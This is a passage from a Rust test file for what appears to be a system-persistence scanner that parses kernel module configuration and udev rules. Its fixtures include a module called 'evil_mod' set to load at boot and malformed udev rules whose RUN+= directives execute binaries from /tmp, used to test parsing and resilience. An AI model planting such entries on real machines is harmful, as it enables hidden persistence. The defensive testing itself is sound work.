        let blacklist = one(&s, |e| e.name == "blacklist:nouveau");
        assert_eq!(blacklist.command, None, "a blacklist runs nothing");
        let alias = one(&s, |e| e.name == "alias:net-pf-10");
        assert_eq!(alias.raw.get("module").map(String::as_str), Some("off"));
        let options = one(&s, |e| e.name == "options:usbcore");
        assert_eq!(options.raw.get("args").map(String::as_str), Some("autosuspend=-1"));
        assert!(!s.entries.iter().any(|e| e.name.starts_with("softdep")), "softdep runs no command");

        let param = one(&s, |e| e.name == "evil_mod");
        assert_eq!(param.raw.get("directive").map(String::as_str), Some("load"));
        assert_eq!(param.raw.get("params").map(String::as_str), Some("param=1"));
        assert!(s.entries.iter().any(|e| e.name == "vboxdrv"));
        assert!(s.entries.iter().any(|e| e.name == "loop"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn an_offline_root_reports_the_missing_loaded_module_list() {
        let dir = tree("offline");
        put(&dir, "etc/modules", b"evil_mod\n");
        put(&dir, "proc/modules", b"evil_mod 16384 0 - Live 0xffffffffc0000000\n");

        let s = scan(&dir);
        assert!(
            !s.entries.iter().any(|e| e.source.ends_with("proc/modules")),
            "/proc/modules is live-only; an image's copy is not the running kernel"
        );
        let configured = one(&s, |e| e.name == "evil_mod");
        assert_eq!(configured.enabled, Enablement::Unknown);
        assert!(configured.has_flag(Flag::DegradedEnablement));
        match status(&s) {
            Status::Partial { unreadable } => {
                assert!(unreadable.iter().any(|u| u.contains("proc/modules")), "{unreadable:?}")
            }
            other => panic!("the absent loaded-module list must be visible, got {other:?}"),
        }
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn hostile_rules_do_not_panic() {
        let dir = tree("hostile");
        let mut bad = Vec::new();
        bad.extend_from_slice(b"SUBSYSTEM==\"usb\", RUN+=\"/tmp/unterminated\n");
        bad.extend_from_slice(b"====,,,,\n!\n{}\n\"\"\"\n");
        bad.extend_from_slice(b"ATTRS{unterminated, RUN+=\"/tmp/z\"\n");
        bad.extend_from_slice(b"RUN\n");
        bad.extend_from_slice(b"\xff\xfe\xfd==\"\xff\", RUN+=\"\xff\"\n");
        bad.extend_from_slice(b"ACTION==\"add\", RUN+=\"/tmp/eof\" \\");
        put(&dir, "etc/udev/rules.d/99-bad.rules", &bad);
        put(&dir, "etc/modprobe.d/bad.conf", b"install\nremove\nalias\n \\\n#\ninstall x\n");

        // A rules file far past the read cap: truncated and recorded, never fatal.
        let line = format!("ACTION==\"add\", ATTRS{{serial}}==\"{}\", RUN+=\"/tmp/flood\"\n", "A".repeat(900));
        put(&dir, "etc/udev/rules.d/98-huge.rules", line.repeat(11_000).as_bytes());

        let s = scan(&dir);
        if let Status::Failed { error } = status(&s) {
            panic!("hostile input killed the collector: {error}");
        }
        let truncated = &s.header.collectors.iter().find(|c| c.name == "kernel").unwrap().truncated;
        assert!(
            truncated.iter().any(|u| u.contains("98-huge.rules")),
            "the truncated read must be recorded: {truncated:?}"
        );
        assert!(of_kind(&s, Kind::Udev).len() > 100, "the readable part of the flood still parsed");
        fs::remove_dir_all(&dir).unwrap();
    }
}
